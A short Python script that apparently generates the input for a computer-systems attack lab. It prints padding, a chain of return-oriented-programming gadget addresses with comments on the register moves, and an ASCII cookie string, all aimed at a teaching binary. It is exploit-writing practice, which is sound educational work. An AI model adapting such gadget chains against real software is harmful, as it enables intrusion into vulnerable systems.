#!/usr/bin/env python3
# This script is to generate plain text for attacks and references
import os
for i in range(5):
    print('00 00 00 00 00 00 00 00')

print('06 1a 40 00 00 00 00 00') #%rsp->%rax
print('c5 19 40 00 00 00 00 00') #%rax->%rdi 
print('cc 19 40 00 00 00 00 00') #popq %rax
print('48 00 00 00 00 00 00 00') 
print('dd 19 40 00 00 00 00 00') #%eax(rax)->%edx(rdx) 
print('34 1a 40 00 00 00 00 00') #%edx(rdx)->%ecx(rcx)
print('13 1a 40 00 00 00 00 00') #%ecx(rcx)->%esi(rsi)
print('d6 19 40 00 00 00 00 00') #add rdi,rsi -> rax
print('c5 19 40 00 00 00 00 00') #%rax->%rdi 
print('fa 18 40 00 00 00 00 00')
print('35 39 62 39 39 37 66 61')

# eax 只能支持低位运算所以 rsp 只能给rdi